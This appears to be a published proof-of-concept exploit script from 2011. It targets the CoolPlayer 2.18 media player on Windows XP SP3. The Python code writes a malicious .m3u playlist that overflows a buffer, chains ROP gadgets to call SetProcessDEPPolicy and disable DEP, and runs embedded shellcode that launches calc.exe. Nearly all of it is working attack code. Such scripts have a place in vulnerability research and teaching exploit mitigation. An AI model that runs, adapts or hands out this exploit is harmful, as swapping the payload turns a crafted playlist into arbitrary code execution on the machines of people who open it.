# Exploit Title: CoolPlayer 2.18 DEP Bypass
# Date: January 2, 2011
# Author: Blake
# Version: 2.18
# Tested on: Windows XP SP3 running in Virtualbox
# Uses SetProcessDEPPolicy() to disable DEP for the process
# Thanks to mr_me for the encouragement
# Exploit-DB Notes: May not work on all Win XP SP3 machines
 
print "\n============================"
print "CoolPlayer 2.18 DEP Bypass"
print "Written by Blake"
print "============================\n"
 
# windows/exec calc.exe 227 bytes - 240 bytes of shellcode space available
shellcode =(
"\xda\xda\xd9\x74\x24\xf4\xbf\xe7\x18\x22\xfb\x2b\xc9\xb1\x33"
"\x5e\x31\x7e\x17\x83\xee\xfc\x03\x99\x0b\xc0\x0e\x99\xc4\x8d"
"\xf1\x61\x15\xee\x78\x84\x24\x3c\x1e\xcd\x15\xf0\x54\x83\x95"
"\x7b\x38\x37\x2d\x09\x95\x38\x86\xa4\xc3\x77\x17\x09\xcc\xdb"
"\xdb\x0b\xb0\x21\x08\xec\x89\xea\x5d\xed\xce\x16\xad\xbf\x87"
"\x5d\x1c\x50\xa3\x23\x9d\x51\x63\x28\x9d\x29\x06\xee\x6a\x80"
"\x09\x3e\xc2\x9f\x42\xa6\x68\xc7\x72\xd7\xbd\x1b\x4e\x9e\xca"
"\xe8\x24\x21\x1b\x21\xc4\x10\x63\xee\xfb\x9d\x6e\xee\x3c\x19"
"\x91\x85\x36\x5a\x2c\x9e\x8c\x21\xea\x2b\x11\x81\x79\x8b\xf1"
"\x30\xad\x4a\x71\x3e\x1a\x18\xdd\x22\x9d\xcd\x55\x5e\x16\xf0"
"\xb9\xd7\x6c\xd7\x1d\xbc\x37\x76\x07\x18\x99\x87\x57\xc4\x46"
"\x22\x13\xe6\x93\x54\x7e\x6c\x65\xd4\x04\xc9\x65\xe6\x06\x79"
"\x0e\xd7\x8d\x16\x49\xe8\x47\x53\xab\x19\x5a\x49\x3c\x80\x0f"
"\x30\x20\x33\xfa\x76\x5d\xb0\x0f\x06\x9a\xa8\x65\x03\xe6\x6e"
"\x95\x79\x77\x1b\x99\x2e\x78\x0e\xfa\xb1\xea\xd2\xd3\x54\x8b"
"\x71\x2c")
 
 
buffer = "\x41" * 220
eip = "\x28\xb0\x9f\x7c"                # POP ECX / RETN - SHELL32.DLL 7C9FB028
offset1 = "\x42" * 4
nop = "\x90" * 10
 
# put zero in EBX
rop = "\xdd\xad\x9e\x7c"                # POP EBX / RETN - SHELL32.DLL 7C9EADDD
rop += "\xff\xff\xff\xff"               # placed into ebx
rop += "\xe1\x27\xc1\x77"               # INC EBX / RETN - MSVCRT.DLL 77C127E1
 
# set EBP to point to SetProcessDEPPolicy
rop += "\x7b\xa6\x9e\x7c"               # POP EBP / RETN - SHELL32.DLL 7C9EA67B
rop += "\xa4\x22\x86\x7c"               # address of SetProcessDEPPolicy XP SP3
 
# set EDI as a pointer to RET (rop nop)
rop += "\x47\xeb\x9e\x7c"               # POP EDI / RETN - SHELL32.DLL 7C9EEB47
rop += "\x08\x15\x9c\x7c"               # RETN - SHELL32.DLL 7C9C1508          
 
# set ESI as a pointer to RET (rop nop)
rop += "\x4c\x20\x9c\x7c"               # POP ESI / RETN - SHELL32.DLL 7C9C204C
rop += "\x51\x20\x9c\x7c"               # RETN - SHELL32.DLL 7C9C2051          
 
# set ESP to point at nops
rop += "\x73\x10\xa1\x7c"               # PUSHAD / RETN - SHELL32.DLL 7CA11073
 
print "[*] Creating malicious m3u file"
try:
    file = open("exploit.m3u","w")
    file.write(buffer + eip + offset1 + rop + nop + shellcode)
    file.close()
    print "[*] File created"
except:
    print "[x] Error creating file!"
 
raw_input("\nPress any key to exit...")
